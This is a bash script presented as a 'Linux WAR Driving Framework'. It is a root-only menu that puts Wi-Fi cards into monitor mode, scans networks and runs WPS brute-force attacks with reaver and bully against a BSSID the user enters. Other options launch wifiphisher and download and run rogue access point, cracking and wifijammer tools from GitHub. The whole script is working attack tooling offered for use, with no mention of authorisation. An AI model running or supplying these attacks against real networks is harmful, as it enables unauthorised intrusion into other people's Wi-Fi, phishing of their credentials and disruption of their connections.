#!/bin/bash
# SCRIPT: War_deamon.sh
# REV: Version 1.0
# PLATFORM: Linux
# AUTHOR: Coenraad
# Wardriving Tool Kit 
# PURPOSE: WAR WIFI 
# 
##########################################################
########### DEFINE FILES AND VARIABLES HERE ##############
##########################################################
# Run as root.
if [[ $EUID -ne 0 ]]; then
    echo -e "\e[1mMust be ROOT to run  this script!\e[0m"
    echo -e "\e[1mMust be ROOT to run  this script!\e[0m"
    echo -e "\e[1mMust be ROOT to run  this script!\e[0m"
    exit 1
fi

clear
##########################################################
################ BEGINNING OF MAIN #######################
##########################################################
function see_devices() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m Devive Info !!!  \e[0m"
    echo
    iwconfig

}


function info_recon() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m Recon and Info !!!  \e[0m"
    echo
    echo "Pick Monitoring Device for RECON"
    iwconfig
    echo 
    echo "Type Device Name Use for Recon:"
    read devices_recon 
      echo -e "\e[1m Must hit ctrl-c to stop session !\e[0m"
    sleep 2
    airodump-ng $devices_recon
}


function show_menus()
{
echo -e "PART A : Devices Setup and Recon"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'a' for SHOW WIFI DEVICES !!! \e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'b' for SET DEVICES TO MONITOR !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'c' for RECON: GATHER NETWORK INFO AND TARGET DEVICES !!!\e[0m"

echo 
echo -e "PART B : Basic Wifi Attacks "
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'd' for BASIC REAVER ATTACK !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'e' for BASIC BULLY ATTACK !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'f' for BASIC WIFIPHISER ATTACK - 2 network cards needed - !!!\e[0m"

echo
echo -e "PART C : Adv. Wifi Attacks "
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'xx' for RECON: Installer for some basic wifi tools !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'x1' for RECON: Installer PIXIEwps Brute Force wifi tools !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'x2' for RECON: Installer WIFITAP WiFi injection tool through tun/tap device !!!\e[0m"
echo
echo -e "PART D : Rogue Wi-Fi Access Point Attack and Other GUI TOOLS"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '1' for WIFI-PUMPKIN !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '11' for FERN-WIFI-CRACKER !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '12' for GHOST-PHISER !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '13' for WARCARRIER !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '14' for AIRGEDDON !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '15' for ATEAR !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '16' for FRUITYWIFI !!!\e[0m"
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '17' for GERIX-wifi-cracker-2 !!!\e[0m"

echo -e "PART E : The Whole Thing "
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '21' for Some Great Stuff - Please istall packages One By One !!!\e[0m"
echo
echo 
echo -e "PART F : Wifite automated wireless attack tool "
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit '2' for WIFITE - 1 network card , disable other !!!\e[0m"
echo 
echo -e "PART G  : Wifi disrupt wireless attack tool "
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'yy' for DISRUPT: Installer wifijammer wifi disrupt tool \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
echo 
echo -e "\e[32m[-]\e[0m \e[1m   Choose : Hit 'x' to EXIT !!!\e[0m"
echo "Pick Option:" 
}

function mode_set()
{
 echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m Pick device to set to MONITOR MODE !!!  \e[0m"
    echo
    echo TYPE NAME OF DEVICE FOR MONITOR MODE : 
    read wifi_device 
    ifconfig $wifi_device down
    iwconfig $wifi_device mode monitor
    ifconfig  $wifi_device up
    iwconfig $wifi_device
    sleep 2   
}


function basic_reaver() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m Very Basic Reaver Attack !!!  \e[0m"
    echo 
    echo -e "Very Basic Reaver Attack, use REAVER full tool for differnt switches "
    echo
    sudo apt-get upgrade reaver
    echo "Pick Monitoring Device for RECON and REAVER !!!"
    iwconfig
    echo 
    echo "Type Device Name Use for Recon and Reaver:"
    read devices_recon 
    echo -e "\e[1m Must hit ctrl-c to stop session !\e[0m"
    sleep 2
    airodump-ng $devices_recon
    echo 
    echo -e "\e[40;38;5;82m [*] \e[30;48;5;82m REAVER TARGET BSSID: \e[0m"
    read reaver_b
    echo 
    echo -e "\e[40;38;5;82m [*] \e[30;48;5;82m REAVER CHANNEL : \e[0m"
    read reaver_c
    echo 
    echo -e "\e[40;38;5;82m [*] \e[30;48;5;82m REAVER ESSID: \e[0m"
    read reaver_e
    echo -e "\e[1m Must hit ctrl-c to stop session !\e[0m"
    sleep 2
    reaver -i $devices_recon -c $reaver_c -b $reaver_b -e $reaver_e -vvv
    echo 

}

function basic_bully() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m Very Basic Bully Attack !!!  \e[0m"
    echo 
    echo -e "Very Basic Bully Attack, use BULLY full tool for differnt switches "
    echo
    sudo apt-get upgrade bully
    echo "Pick Monitoring Device for RECON and BULLY !!!"
    iwconfig
    echo 
    echo "Type Device Name Use for Recon and BULLY:"
    read devices_recon 
    echo -e "\e[1m Must hit ctrl-c to stop session !\e[0m"
    sleep 2
    airodump-ng $devices_recon
    echo 
    echo -e "\e[40;38;5;82m [*] \e[30;48;5;82m BULLY TARGET BSSID: \e[0m"
    read bully_b

    sleep 2
    bully -b $bully_b $devices_recon
    echo
}

function basic_wifiphisher() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m Very Basic Wifiphisher Attack !!!  \e[0m"
    echo 
    echo -e "!!! Needs Two  Networks Cards !!! "
    echo
    wifiphisher
    echo
}

function WiFi-Pumpkin() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m Framework for Rogue Wi-Fi Access Point Attack !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git
    cd WiFi-Pumpkin
    ./installer.sh --install
    echo
    echo -s "Starting WiFi-Pumpkin"
    echo
    python2 wifi-pumpkin.py
    clear
}

function wifite() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  Wifite An automated wireless attack tool.  !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    wget https://raw.github.com/derv82/wifite/master/wifite.py
    chmod +x wifite.py
    echo
    echo -s "Starting WiFite"
    echo
    ./wifite.py
    clear
}

function ghost() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  Ghost Phisher.  Wireless and Ethernet security auditing and attack software  !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    apt-get install ghost-phisher
    echo -s "Ghost Phisher"
    echo
    ghost-phisher
    clear
}

function fern() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  Wifite An automated wireless attack tool.  !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
    cd Fern-Wifi-Cracker/
    chmod +x execute.py
    echo
    echo -s "Starting Fern-Wifi-Cracker"
    echo
    ./execute.py
    clear
}


function airgeddon() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  Airgeddon An automated wireless attack tool.  !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    sudo apt-get install  hashcat pixiewps dsniff bettercap iw net-tools sslstrip beef unbuffer beef-xss expect sslstrip
    cd /tmp
    git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
    cd airgeddon
    chmod +x airgeddon.sh
    echo
    echo -s "Starting  Airgeddon"
    echo
    ./airgeddon.sh
    clear
}

function warcarrier() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  Warcarrier is a dashboard for scanning and trolling 802.11 WiFi, 802.15.1 Bluetooth, and GPS.  !!!  \e[0m"
    echo 
    echo -e "You will need to install Spectools_raw https://www.kismetwireless.net/spectools/ Net::Bluetooth    http://search.cpan.org/~iguthrie/Net-Bluetooth-0.40/Bluetooth.pm"
    echo -e "Install CPAN Perl"
    echo -e  "HTML::GMap"
    echo -e "\e[1m Must hit ctrl-c to stop session  and do this for first time, or ignore if done. !\e[0m"
    sleep 5
    echo -e "!!! Quick Setup !!! "
    sudo apt-get install  libcurses-ui-perl libjson-xs-perl libnet-bluetooth-perl libgeo-google-mapobject-perl gmap gmap-dbgsym
    pip2 install python-gmaps
    cd /tmp
    git clone https://github.com/dinosec/ubertooth-install.git
    cd ubertooth-install
    chmod +x ubertooth_install.sh
    ./ubertooth_install.sh
    cd /tmp
    git clone https://github.com/weaknetlabs/warcarrier.git
    cd warcarrier
    chmod +x warcarrier
    echo
    echo -s "Warcarrier"
    echo
    ./warcarrier
    clear
}

function AtEar() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  AtEar , is a wireless pentest system. !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    sudo apt-get install  aircrack-ng tshark hostapd python-dev python-flask python-paramiko python-psycopg2 python-pyodbc python-sqlite python-pip
    sudo pip2 install python-libnmap
    cd /tmp
    git clone https://github.com/NORMA-Inc/AtEar.git
    cd  AtEar/
    chmod +x install.sh
    ./install.sh
    echo -s "Starting  AtEar"
    echo
    iwconfig
    echo 
    echo -e "Pick Wifi Device"
    read devices_atear
    python2 run.py --iface $devices_atear
    clear
}

function fruitywifi() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  FruityWifi is an open source tool to audit wireless networks !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    git clone https://github.com/xtr4nge/FruityWifi.git
    cd  FruityWifi/
    chmod +x install-FruityWifi.sh
    ./install-FruityWiFi.sh 
    echo -s "Starting  FruityWifi"
    /etc/init.d/fruitywifi start
    /etc/init.d/php5-fpm start
    clear
}

function gerix_wifi() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  GERIX-wifi-cracker-2 is an open source tool to audit wireless networks !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    git clone https://github.com/J4r3tt/gerix-wifi-cracker-2.git
    echo 
    echo -s "GERIX-wifi-cracker-2"
    echo -s "REQUISITES: You need the modules: qt (v.4) LAUNCH:"
    echo -s " To launch the program use:"
    echo -s "$ python gerix.py"
    echo -s "Enjoy!"
    echo -s " to run as root  or sudo "
    echo -s " sudo python /tmp/gerix-wifi-cracker-2/gerix.py"
    sleep 10
    clear
}


function whole_thing() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  Some Great Stuff  to audit wireless networks !!!  \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    git clone https://github.com/0x90/wifi-arsenal.git
    echo 
    echo -s "Please install packages One By One "
    echo -s "Be sure what YOU INSTALL!!!!"
    sleep 8
    clear
}

function basic_tools() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  RECON: Installer for some basic wifi tools!!! \e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    git clone https://github.com/rockymeza/wifi.git
    echo 
    echo -s "Install tools a root in new shell!!!"
    echo -s "Read https://wifi.readthedocs.io/en/latest/ !!!!"
    echo -s "example: wifi -i wlp3s0 list"
    sleep 8
    clear
}

function pixiewps() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  RECON: Installer PIXIEwps Brute Force wifi tools !!!\e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    sudo apt-get -y install build-essential
    cd /tmp
    git clone https://github.com/wiire/pixiewps.git
    echo 
    echo -s "Install tools a root in new shell!!!"
    echo -s "Read https://github.com/wiire/pixiewps!!!!"
    sleep 8
    clear
}

function wifitap() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  RECON: Installer WIFITAP WiFi injection tool through tun/tap device !!!\e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    git clone https://github.com/GDSSecurity/wifitap.git
    echo 
    echo -s "Install tools a root in new shell!!!"
    echo -s "Read https://github.com/GDSSecurity/wifitap!!!!"
    echo -s "Read http://sid.rstack.org/static/articles/w/i/f/Wifitap_EN_9613.html"
    sleep 8
    clear
}


function wifijammer() 
{
    echo
    echo -e "\e[40;38;5;82m [+] \e[30;48;5;82m  DISRUPT: Installer wifijammer wifi disrupt tool \e[5mB *** USE WITH CAUTION ***  !!!!\e[0m"
    echo 
    echo -e "!!! Quick Setup !!! "
    cd /tmp
    git clone https://github.com/DanMcInerney/wifijammer.git
    echo 
    echo -s "Install tools a root in new shell!!!"
    echo -s "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -s "Read https://github.com/DanMcInerney/wifijammer!!!"
    sleep 8
    clear
}



echo -e "Quick setup!!!"
#apt-get install airmon-ng bully reaver wifiphisher gitclone tcpdump libpcap0.8 libpcap0.8-dev pyrit tshark cowpatty 
#apt-get install tcpdump graphviz imagemagick python-gnuplot python-cryptography python-pyx
#pip2 install scapy
# Not needed with kali !
clear 
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
echo -e "\e[40;38;5;82m Linux WAR Driving Framework v.1 \e[30;48;5;82m Control \e[0m"
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
echo
echo -e "\e[0m PLEASE Pick a option:"
echo -e "\e[94m - Steps made easy for Wardriving Linux "
echo -e "\e[94m All stools auto update at startup - BETTER! "
echo

echo -e "Also this script must be executed as ROOT  "
echo -e "HINT: Configure devices , Plan attack type! , Gather PCAP , Execute Attack! \e[0m"
echo


show_menus

read choice
if [ "$choice" == a ]; then
    see_devices
    show_menus
    read choice
fi

if [ "$choice" == b ]; then
    mode_set
    show_menus
    read choice
fi

if [ "$choice" == c ]; then
    info_recon
    show_menus
    read choice
fi

if [ "$choice" == d ]; then
    basic_reaver
    show_menus
    read choice
fi

if [ "$choice" == e ]; then
    basic_bully
    show_menus
    read choice
fi

if [ "$choice" == f ]; then
    basic_wifiphisher
    show_menus
    read choice
fi

if [ "$choice" == 1 ]; then
    WiFi-Pumpkin
    show_menus
    read choice
fi

if [ "$choice" == 11 ]; then
    fern
    show_menus
    read choice
fi

if [ "$choice" == 12 ]; then
    ghost
    show_menus
    read choice
fi

if [ "$choice" == 13 ]; then
    warcarrier
    show_menus
    read choice
fi

if [ "$choice" == 14 ]; then
    airgeddon
    show_menus
    read choice
fi

if [ "$choice" == 15 ]; then
    AtEar
    show_menus
    read choice
fi


if [ "$choice" == 16 ]; then
    fruitywifi
    show_menus
    read choice
fi


if [ "$choice" == 17 ]; then
    gerix_wifi
    show_menus
    read choice
fi


if [ "$choice" == 2 ]; then
    wifite
    show_menus
    read choice
fi

if [ "$choice" == 21 ]; then
    whole_thing
    show_menus
    read choice
fi

if [ "$choice" == xx ]; then
    basic_tools
    show_menus
    read choice
fi

if [ "$choice" == x1 ]; then
    pixiewps
    show_menus
    read choice
fi

if [ "$choice" == x2 ]; then
    wifitap
    show_menus
    read choice
fi


if [ "$choice" == yy ]; then
    wifijammer
    show_menus
    read choice
fi



if [ "$choice" == x ]; then
    clear
    sleep 2
    echo -e "\e[40;38;5;82m [*] \e[30;48;5;82m THANK YOU FOR USING ME !!!  \e[0m"
    echo -e "\e[40;38;5;82m [*] \e[30;48;5;82m Any info contact me : coenraadlamprecht@gmail.com  \e[0m"
    exit 0
fi


exit 0
